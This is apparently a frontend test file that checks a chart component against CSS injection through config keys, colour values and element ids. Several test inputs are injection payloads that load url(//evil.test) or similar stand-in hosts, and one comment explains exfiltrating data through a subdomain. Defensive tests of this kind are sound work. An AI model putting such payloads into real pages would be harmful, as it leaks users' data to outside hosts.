import { render } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { ChartContainer, ChartStyle } from "@/components/ui/chart";
import type { ChartConfig } from "@/components/ui/chart";

function styleText(container: HTMLElement): string {
  return container.querySelector("style")?.textContent ?? "";
}

describe("ChartStyle CSS injection", () => {
  it("drops config keys that are not plain CSS identifiers", () => {
    // The tag aggregation panel keys its config by eval tag name, which a user
    // (or a connected MCP server) supplies.
    const config = {
      "a; background-image: url(https://evil.test/?x=)": {
        label: "tag",
        color: "var(--chart-1)",
      },
    } as unknown as ChartConfig;

    const { container } = render(<ChartStyle id="chart-x" config={config} />);
    expect(styleText(container)).not.toContain("evil.test");
  });

  it("drops colors that could close the declaration", () => {
    const config = {
      passRate: { label: "Pass rate", color: "red; --leak: url(//evil.test)" },
    } as unknown as ChartConfig;

    const { container } = render(<ChartStyle id="chart-x" config={config} />);
    expect(styleText(container)).not.toContain("evil.test");
  });

  it("keeps legitimate colors", () => {
    const config = {
      passRate: { label: "Pass rate", color: "var(--chart-1)" },
      judgeScore: { label: "Judge", color: "hsl(var(--muted-foreground))" },
      raw: { label: "Raw", color: "#6b5e50" },
      p50Seconds: {
        label: "p50",
        color: "color-mix(in oklch, var(--chart-1) 55%, transparent)",
      },
    } satisfies ChartConfig;

    const { container } = render(<ChartStyle id="chart-x" config={config} />);
    const css = styleText(container);
    expect(css).toContain("--color-passRate: var(--chart-1);");
    expect(css).toContain("--color-judgeScore: hsl(var(--muted-foreground));");
    expect(css).toContain("--color-raw: #6b5e50;");
    expect(css).toContain(
      "--color-p50Seconds: color-mix(in oklch, var(--chart-1) 55%, transparent);",
    );
  });

  // The reason `/` is not in CSS_COLOR, pinned so it cannot be "helpfully"
  // added later for space-separated alpha. A protocol-relative URL needs no
  // `:` and no `;`, so with `/` admitted this value clears every other guard
  // in the file and writes an attacker-chosen fetch into the page. The value
  // is deliberately minimal — no `?`, no `=`, nothing else outside the
  // charset — so this fails the moment `/` is admitted and not one character
  // sooner. Data rides out on the subdomain; a path is not needed.
  it("drops a protocol-relative url that needs no colon or semicolon", () => {
    const config = {
      passRate: { label: "Pass rate", color: "url(//evil.test)" },
    } as unknown as ChartConfig;

    const { container } = render(<ChartStyle id="chart-x" config={config} />);
    expect(styleText(container)).not.toContain("evil.test");
  });

  // The same channel one step further out: `/*` would let a value comment away
  // the rest of the declaration block.
  it("drops a value that could open a comment", () => {
    const config = {
      passRate: { label: "Pass rate", color: "red/*" },
    } as unknown as ChartConfig;

    const { container } = render(<ChartStyle id="chart-x" config={config} />);
    expect(styleText(container)).not.toContain("/*");
  });

  it("warns in development rather than dropping a value silently", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      render(
        <ChartStyle
          id="chart-x"
          config={
            {
              "a; background-image: url(https://evil.test)": {
                label: "tag",
                color: "var(--chart-1)",
              },
            } as unknown as ChartConfig
          }
        />,
      );
      expect(warn).toHaveBeenCalledWith(
        expect.stringContaining("dropped config key"),
      );
    } finally {
      warn.mockRestore();
    }
  });

  it("ignores an id that would break out of the attribute selector", () => {
    const { container } = render(
      <ChartContainer
        id="x] { background-image: url(https://evil.test) } [data-chart=y"
        config={{ passRate: { label: "Pass rate", color: "var(--chart-1)" } }}
      >
        <div />
      </ChartContainer>,
    );
    expect(styleText(container)).not.toContain("evil.test");
  });
});
